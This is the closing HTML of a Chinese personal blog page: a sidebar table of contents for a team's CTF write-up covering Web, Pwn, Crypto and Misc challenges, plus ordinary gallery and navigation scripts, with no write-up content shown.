<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2024/05/17/house-of-muney/">house_of_muney 上一篇 →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/faction/4.png" alt="Logo"></a><h1 id="Dr"><a target="_blank" rel="noopener" href="https://str1ke4fun.github.io/">str1k3</a></h1><div id="description"><p></p></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Write-up-written-by-%E5%90%83%E7%83%A7%E9%B8%A1%E4%BC%9A-pwned"><span class="toc-number">1.</span> <span class="toc-text">Write up written by 吃烧鸡会 pwned</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%9F%E4%BC%8D%E4%BF%A1%E6%81%AF"><span class="toc-number">1.1.</span> <span class="toc-text">队伍信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Simple-php"><span class="toc-number">1.2.1.</span> <span class="toc-text">Simple_php</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%AF%B4%E6%98%8E"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">题目说明</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">解题思路</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easycms-revenge"><span class="toc-number">1.2.2.</span> <span class="toc-text">easycms_revenge</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%AF%B4%E6%98%8E-1"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">题目说明</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-1"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">解题思路</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezjava-%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.2.3.</span> <span class="toc-text">ezjava| 复现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%AF%B4%E6%98%8E-2"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">题目说明</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-2"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">解题思路</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#R-sanic-%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.2.4.</span> <span class="toc-text">R |sanic| 复现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%AF%B4%E6%98%8E-3"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">题目说明</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-3"><span class="toc-number">1.2.4.2.</span> <span class="toc-text">解题思路</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-number">1.3.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#gostack"><span class="toc-number">1.3.1.</span> <span class="toc-text">gostack</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%AF%B4%E6%98%8E-4"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">题目说明</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-4"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">解题思路</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#orange-cat-diary"><span class="toc-number">1.3.2.</span> <span class="toc-text">orange_cat_diary</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%AF%B4%E6%98%8E-5"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">题目说明</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-5"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">解题思路</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EzHeap-%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.3.3.</span> <span class="toc-text">EzHeap| 复现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">1.4.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#OvO"><span class="toc-number">1.4.1.</span> <span class="toc-text">OvO</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.5.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-6"><span class="toc-number">1.6.</span> <span class="toc-text">解题思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hash"><span class="toc-number">1.6.1.</span> <span class="toc-text">hash</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%AF%B4%E6%98%8E-6"><span class="toc-number">1.7.</span> <span class="toc-text">题目说明</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-7"><span class="toc-number">1.8.</span> <span class="toc-text">解题思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.8.1.</span> <span class="toc-text">1.信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E9%A2%98%E7%9B%AE%E6%B5%81%E7%A8%8B"><span class="toc-number">1.8.2.</span> <span class="toc-text">2.题目流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%A7%A3%E9%A2%98"><span class="toc-number">1.8.3.</span> <span class="toc-text">3.解题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%AE%8C%E6%95%B4%E8%84%9A%E6%9C%AC"><span class="toc-number">1.8.4.</span> <span class="toc-text">4.完整脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81"><span class="toc-number">1.8.5.</span> <span class="toc-text">古典密码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%AF%B4%E6%98%8E-7"><span class="toc-number">1.8.5.1.</span> <span class="toc-text">题目说明</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-8"><span class="toc-number">1.8.5.2.</span> <span class="toc-text">解题思路</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">1.9.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%81%AB%E9%94%85%E9%93%BE%E8%A7%82%E5%85%89%E6%89%93%E5%8D%A1"><span class="toc-number">1.9.1.</span> <span class="toc-text">火锅链观光打卡</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%AF%B4%E6%98%8E-8"><span class="toc-number">1.9.1.1.</span> <span class="toc-text">题目说明</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-9"><span class="toc-number">1.9.1.2.</span> <span class="toc-text">解题思路</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Power-Trajectory-Diagram"><span class="toc-number">1.9.2.</span> <span class="toc-text">Power Trajectory Diagram</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%AF%B4%E6%98%8E-9"><span class="toc-number">1.9.2.1.</span> <span class="toc-text">题目说明</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-10"><span class="toc-number">1.9.2.2.</span> <span class="toc-text">解题思路</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E9%A3%8E%E6%9C%BA"><span class="toc-number">1.9.3.</span> <span class="toc-text">通风机</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%AF%B4%E6%98%8E-10"><span class="toc-number">1.9.3.1.</span> <span class="toc-text">题目说明</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-11"><span class="toc-number">1.9.3.2.</span> <span class="toc-text">解题思路</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E7%A5%9E%E7%A7%98%E6%96%87%E4%BB%B6"><span class="toc-number">1.9.4.</span> <span class="toc-text">4. 神秘文件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%AF%B4%E6%98%8E-11"><span class="toc-number">1.9.4.1.</span> <span class="toc-text">题目说明</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-12"><span class="toc-number">1.9.4.2.</span> <span class="toc-text">解题思路</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%97%E7%89%88%E8%BD%AF%E4%BB%B6"><span class="toc-number">1.9.5.</span> <span class="toc-text">盗版软件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%AF%B4%E6%98%8E-12"><span class="toc-number">1.9.5.1.</span> <span class="toc-text">题目说明</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-13"><span class="toc-number">1.9.5.2.</span> <span class="toc-text">解题思路</span></a></li></ol></li></ol></li></ol></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>